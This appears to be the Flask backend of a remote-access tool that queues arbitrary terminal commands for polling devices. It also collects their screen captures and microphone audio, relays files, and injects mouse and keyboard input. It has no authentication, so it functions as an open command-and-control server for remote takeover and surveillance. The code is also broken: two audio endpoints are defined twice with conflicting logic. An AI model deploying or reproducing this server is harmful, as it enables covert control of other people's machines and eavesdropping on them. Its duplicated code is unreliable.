#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2025 SirAbody. All rights reserved.

from flask import Flask, request, jsonify, send_file, Response, render_template, redirect, url_for
from flask_cors import CORS
import os
import json
import tempfile
import base64
import time
import io
from PIL import Image
import datetime
from werkzeug.utils import secure_filename

app = Flask(__name__, static_folder='static', template_folder='templates')
CORS(app)

# Store for commands and their outputs
command_store = {}
# Store for file transfers
file_transfer_store = {}
# Store for screen sharing data
screen_store = {}
# Store for mouse control commands
mouse_control_store = {}
# Store for mouse control results
mouse_control_results = {}
# Store for keyboard input commands
keyboard_store = {}
# Store for keyboard input results
keyboard_results = {}
# Store for audio data
audio_store = {}
# Buffer size for audio data
AUDIO_BUFFER_SIZE = 50  # Store up to 50 audio chunks per device

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/info')
def api_info():
    return jsonify({
        "status": "online",
        "info": "SirAbody Remote Command Execution System",
        "copyright": "© 2025 SirAbody. All rights reserved."
    })

@app.route('/api/send-command', methods=['POST'])
def send_command():
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({"error": "Invalid command data"}), 400
    
    command_id = str(time.time())
    command_store[command_id] = {
        "command": data['command'],
        "status": "pending",
        "output": None,
        "timestamp": time.time()
    }
    
    return jsonify({
        "command_id": command_id,
        "status": "pending"
    })

@app.route('/api/get-commands', methods=['GET'])
def get_commands():
    # Endpoint for receiver to poll for pending commands
    pending_commands = {}
    for cmd_id, cmd_data in list(command_store.items()):
        if cmd_data["status"] == "pending":
            pending_commands[cmd_id] = cmd_data
    
    return jsonify(pending_commands)

@app.route('/api/update-command', methods=['POST'])
def update_command():
    data = request.get_json()
    if not data or 'command_id' not in data or 'output' not in data:
        return jsonify({"error": "Invalid update data"}), 400
    
    cmd_id = data['command_id']
    if cmd_id not in command_store:
        return jsonify({"error": "Command ID not found"}), 404
    
    command_store[cmd_id]["status"] = "completed"
    command_store[cmd_id]["output"] = data['output']
    
    return jsonify({"status": "success"})

@app.route('/api/command-status/<command_id>', methods=['GET'])
def command_status(command_id):
    if command_id not in command_store:
        return jsonify({"error": "Command ID not found"}), 404
    
    return jsonify(command_store[command_id])

@app.route('/api/clean-old-data', methods=['POST'])
def clean_old_data():
    # Clean commands older than 1 hour
    current_time = time.time()
    for cmd_id in list(command_store.keys()):
        if current_time - command_store[cmd_id]["timestamp"] > 3600:  # 1 hour
            del command_store[cmd_id]
    
    # Clean file transfers older than 1 hour
    for file_id in list(file_transfer_store.keys()):
        if current_time - file_transfer_store[file_id]["timestamp"] > 3600:  # 1 hour
            # Delete the temp file if it exists
            if "path" in file_transfer_store[file_id]:
                try:
                    os.remove(file_transfer_store[file_id]["path"])
                except:
                    pass
            del file_transfer_store[file_id]
    
    return jsonify({"status": "cleaned"})

@app.route('/api/upload-file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    filename = secure_filename(file.filename)
    temp_dir = tempfile.gettempdir()
    file_id = str(time.time())
    file_path = os.path.join(temp_dir, f"{file_id}_{filename}")
    
    file.save(file_path)
    
    file_transfer_store[file_id] = {
        "filename": filename,
        "path": file_path,
        "status": "available",
        "timestamp": time.time()
    }
    
    return jsonify({
        "file_id": file_id,
        "filename": filename,
        "status": "uploaded"
    })

@app.route('/api/download-file/<file_id>', methods=['GET'])
def download_file(file_id):
    if file_id not in file_transfer_store:
        return jsonify({"error": "File not found"}), 404
    
    file_info = file_transfer_store[file_id]
    
    return send_file(
        file_info["path"],
        as_attachment=True,
        download_name=file_info["filename"]
    )

@app.route('/api/list-files', methods=['GET'])
def list_files():
    # List all available files for download
    available_files = {}
    for file_id, file_info in file_transfer_store.items():
        if file_info["status"] == "available":
            available_files[file_id] = {
                "filename": file_info["filename"],
                "timestamp": file_info["timestamp"]
            }
    
    return jsonify(available_files)

@app.route('/api/update-screen', methods=['POST'])
def update_screen():
    data = request.get_json()
    if not data or 'device_id' not in data or 'screen_data' not in data:
        return jsonify({"error": "Invalid screen data"}), 400
    
    device_id = data['device_id']
    screen_data = data['screen_data']
    
    # Store the latest screen data for this device
    screen_store[device_id] = {
        "screen_data": screen_data,
        "timestamp": time.time()
    }
    
    return jsonify({"status": "success"})

@app.route('/screen/<device_id>')
def view_screen(device_id):
    # Check if we have screen data for this device
    if device_id not in screen_store:
        return render_template('no_device.html', device_id=device_id)
    
    # Get timestamp of last update
    last_update = datetime.datetime.fromtimestamp(screen_store[device_id]['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
    
    return render_template('screen.html', 
                           device_id=device_id, 
                           last_update=last_update)

@app.route('/api/get-screen/<device_id>')
def get_screen(device_id):
    if device_id not in screen_store:
        return jsonify({"error": "Device not found or not sharing screen"}), 404
    
    # Get the latest screen data
    screen_data = screen_store[device_id]['screen_data']
    
    return jsonify({
        "status": "success",
        "screen_data": screen_data,
        "timestamp": screen_store[device_id]['timestamp']
    })

@app.route('/view')
def view_page():
    # Page for entering device ID to view screen
    return render_template('view.html')

@app.route('/connect', methods=['POST'])
def connect_to_device():
    device_id = request.form.get('device_id')
    if not device_id:
        return redirect(url_for('view_page'))
    
    return redirect(url_for('view_screen', device_id=device_id))

# Mouse control API endpoints
@app.route('/api/send-mouse-control/<device_id>', methods=['POST'])
def send_mouse_control(device_id):
    # Endpoint for browser to send mouse control commands
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.get_json()
    if not data or 'action' not in data:
        return jsonify({"error": "Invalid mouse control data"}), 400
    
    # Store the command for the device to pick up
    mouse_control_store[device_id] = {
        "action": data['action'],
        "x": data.get('x'),
        "y": data.get('y'),
        "button": data.get('button'),
        "timestamp": time.time()
    }
    
    return jsonify({"status": "success"})

@app.route('/api/get-mouse-control/<device_id>', methods=['GET'])
def get_mouse_control(device_id):
    # Endpoint for the receiver to poll for mouse control commands
    if device_id not in mouse_control_store:
        return jsonify({}), 200  # No commands, empty response
    
    # Get the command and remove it from the store (one-time use)
    command = mouse_control_store.pop(device_id)
    
    return jsonify(command)

@app.route('/api/mouse-control-result/<device_id>', methods=['POST'])
def mouse_control_result(device_id):
    # Endpoint for the receiver to report mouse control results
    data = request.get_json()
    
    # Store the result
    mouse_control_results[device_id] = {
        "result": data,
        "timestamp": time.time()
    }
    
    return jsonify({"status": "success"})

@app.route('/api/get-mouse-control-result/<device_id>', methods=['GET'])
def get_mouse_control_result(device_id):
    # Endpoint for browser to get mouse control results
    if device_id not in mouse_control_results:
        return jsonify({"status": "pending"}), 200
    
    # Get the result and remove it from the store (one-time use)
    result = mouse_control_results.pop(device_id)
    
    return jsonify(result)

@app.route('/api/set-quality/<device_id>', methods=['POST'])
def set_quality(device_id):
    # Endpoint for browser to set image quality
    data = request.get_json()
    if not data or 'quality' not in data:
        return jsonify({"error": "Invalid quality data"}), 400
    
    quality = data['quality']
    
    # Store as a command for the receiver to pick up
    command_id = str(time.time())
    command_store[command_id] = {
        "command": f"!screen quality={quality}",
        "status": "pending",
        "output": None,
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success", 
        "message": f"Quality set to {quality}",
        "command_id": command_id
    })

# Keyboard input API endpoints
@app.route('/api/keyboard/<device_id>', methods=['POST'])
def keyboard_input(device_id):
    """API endpoint to handle keyboard input commands"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.get_json()
    if not data or 'type' not in data or 'input' not in data:
        return jsonify({"error": "Invalid keyboard data"}), 400
    
    command_id = str(time.time())
    keyboard_store[command_id] = {
        "device_id": device_id,
        "type": data['type'],  # 'text' or 'shortcut'
        "input": data['input'], # text content or key combination
        "status": "pending",
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success", 
        "message": "Keyboard input command sent",
        "command_id": command_id
    })

@app.route('/api/get-keyboard/<device_id>', methods=['GET'])
def get_keyboard_input(device_id):
    """API endpoint for receiver to get pending keyboard commands"""
    # Get pending commands for this device
    pending_commands = []
    for command_id, command in list(keyboard_store.items()):
        if command["device_id"] == device_id and command["status"] == "pending":
            command_copy = command.copy()
            command_copy["command_id"] = command_id
            pending_commands.append(command_copy)
            # Mark as processing
            keyboard_store[command_id]["status"] = "processing"
    
    return jsonify({
        "status": "success",
        "commands": pending_commands
    })

@app.route('/api/keyboard-result/<device_id>', methods=['POST'])
def keyboard_input_result(device_id):
    """API endpoint for receiver to report keyboard command results"""
    data = request.get_json()
    if not data or 'command_id' not in data or 'result' not in data:
        return jsonify({"error": "Invalid result data"}), 400
    
    command_id = data['command_id']
    if command_id not in keyboard_store:
        return jsonify({"error": "Command not found"}), 404
    
    # Update command status
    keyboard_store[command_id]["status"] = "completed"
    keyboard_results[command_id] = {
        "result": data['result'],
        "timestamp": time.time()
    }
    
    return jsonify({"status": "success"})

@app.route('/api/get-keyboard-result/<command_id>', methods=['GET'])
def get_keyboard_input_result(command_id):
    """API endpoint to get the result of a keyboard command"""
    if command_id not in keyboard_store:
        return jsonify({"error": "Command not found"}), 404
    
    if command_id not in keyboard_results:
        return jsonify({
            "status": keyboard_store[command_id]["status"],
            "result": None
        })
    
    return jsonify({
        "status": "completed",
        "result": keyboard_results[command_id]["result"]
    })

# Audio streaming API endpoints
@app.route('/api/audio/upload/<device_id>', methods=['POST'])
def upload_audio(device_id):
    """API endpoint to receive audio data from client"""
    if request.method == 'POST':
        data = request.json
        
        if not data or 'audio_data' not in data:
            return jsonify({"error": "Invalid audio data"}), 400
        
        # Initialize device audio buffer if not exists
        if device_id not in audio_store:
            audio_store[device_id] = {
                "microphone": [],
                "timestamp": time.time()
            }
        
        # Add to audio buffer (FIFO queue)
        audio_store[device_id]["microphone"].append({
            "audio_data": data['audio_data'],
            "format": data.get('format', 'pcm'),
            "channels": data.get('channels', 1),
            "rate": data.get('rate', 16000),
            "timestamp": data.get('timestamp', time.time())
        })
        
        # Limit buffer size
        if len(audio_store[device_id]["microphone"]) > AUDIO_BUFFER_SIZE:
            audio_store[device_id]["microphone"] = audio_store[device_id]["microphone"][-AUDIO_BUFFER_SIZE:]
        
        # Update timestamp
        audio_store[device_id]["timestamp"] = time.time()
        
        return jsonify({"status": "success"})
    
    return jsonify({"error": "Method not allowed"}), 405

@app.route('/api/audio/download/<device_id>', methods=['GET'])
def download_audio(device_id):
    """API endpoint to send audio data to client"""
    if device_id not in audio_store or not audio_store[device_id]["microphone"]:
        return jsonify({"status": "no_data"}), 200
    
    # Get the oldest audio chunk and remove it from the buffer
    audio_chunk = audio_store[device_id]["microphone"].pop(0)
    
    return jsonify({
        "status": "success",
        "audio_data": audio_chunk["audio_data"],
        "format": audio_chunk.get("format", "pcm"),
        "channels": audio_chunk.get("channels", 1),
        "rate": audio_chunk.get("rate", 16000),
        "timestamp": audio_chunk.get("timestamp", time.time())
    })

@app.route('/api/audio/devices/<device_id>', methods=['GET'])
def get_audio_devices(device_id):
    """API endpoint to get available audio devices"""
    # This endpoint simply proxies the request to the client
    # The client will need to check this endpoint and respond with device info
    
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    command_id = str(time.time())
    audio_store[command_id] = {
        "device_id": device_id,
        "command": "get_devices",
        "status": "pending",
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success",
        "message": "Command sent to device",
        "command_id": command_id
    })

@app.route('/api/audio/start/<device_id>', methods=['POST'])
def start_audio(device_id):
    """API endpoint to start audio streaming (microphone or speakers)"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"error": "Invalid request data"}), 400
    
    audio_type = data['type']  # 'microphone' or 'speaker'
    
    if audio_type not in ['microphone', 'speaker']:
        return jsonify({"error": "Invalid audio type"}), 400
    
    command_id = str(time.time())
    command_store[command_id] = {
        "command": f"!audio_start {audio_type}",
        "device_id": device_id,
        "status": "pending",
        "output": None,
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success", 
        "message": f"Started {audio_type}",
        "command_id": command_id
    })

@app.route('/api/audio/stop/<device_id>', methods=['POST'])
def stop_audio(device_id):
    """API endpoint to stop audio streaming (microphone or speakers)"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.json
    if not data or 'type' not in data:
        return jsonify({"error": "Invalid request data"}), 400
    
    audio_type = data['type']  # 'microphone' or 'speaker'
    
    if audio_type not in ['microphone', 'speaker']:
        return jsonify({"error": "Invalid audio type"}), 400
    
    command_id = str(time.time())
    command_store[command_id] = {
        "command": f"!audio_stop {audio_type}",
        "device_id": device_id,
        "status": "pending",
        "output": None,
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success", 
        "message": f"Stopped {audio_type}",
        "command_id": command_id
    })

@app.route('/api/audio/upload/<device_id>', methods=['POST'])
def upload_audio(device_id):
    """API endpoint to receive audio data from device"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.json
    if not data or 'audio_data' not in data:
        return jsonify({"error": "Invalid audio data"}), 400
    
    # Get the audio type (microphone or speaker)
    audio_type = data.get('audio_type', 'microphone')
    
    # Store audio data in memory (or could save to temporary file)
    audio_id = str(time.time())
    audio_store[audio_id] = {
        "device_id": device_id,
        "audio_data": data['audio_data'],
        "audio_type": audio_type,
        "timestamp": time.time()
    }
    
    # Limit the number of audio chunks stored to prevent memory issues
    # Keep only the most recent 100 chunks
    if len(audio_store) > 100:
        oldest_id = min(audio_store.keys(), key=lambda k: audio_store[k]['timestamp'])
        del audio_store[oldest_id]
    
    return jsonify({
        "status": "success", 
        "message": "Audio data received"
    })

@app.route('/api/audio/download/<device_id>', methods=['GET'])
def download_audio(device_id):
    """API endpoint to send audio data to device"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    # Get the audio type (microphone or speaker)
    audio_type = request.args.get('audio_type', 'speaker')
    
    # Find the most recent audio data for this device and type
    relevant_audio = [
        item for item_id, item in audio_store.items()
        if item['audio_type'] == audio_type and item['device_id'] == device_id
    ]
    
    if not relevant_audio:
        return jsonify({
            "status": "success",
            "message": "No audio data available"
        })
    
    # Sort by timestamp and get the most recent
    most_recent = sorted(relevant_audio, key=lambda item: item['timestamp'], reverse=True)[0]
    
    # Remove this item from the store to avoid replaying it
    for key, item in list(audio_store.items()):
        if item['timestamp'] == most_recent['timestamp'] and item['audio_type'] == audio_type:
            del audio_store[key]
            break
    
    return jsonify({
        "status": "success",
        "audio_data": most_recent['audio_data']
    })

# Terminal command API endpoints
@app.route('/api/terminal/<device_id>', methods=['POST'])
def terminal_command(device_id):
    """API endpoint to send terminal command to client"""
    if device_id not in screen_store:
        return jsonify({"error": "Device not found"}), 404
    
    data = request.json
    if not data or 'command' not in data:
        return jsonify({"error": "Invalid command data"}), 400
    
    command_id = str(time.time())
    command_store[command_id] = {
        "command": data['command'],
        "device_id": device_id,
        "status": "pending",
        "output": None,
        "timestamp": time.time()
    }
    
    return jsonify({
        "status": "success", 
        "message": "Command sent to device",
        "command_id": command_id
    })

if __name__ == "__main__":
    # Create necessary directories if they don't exist
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
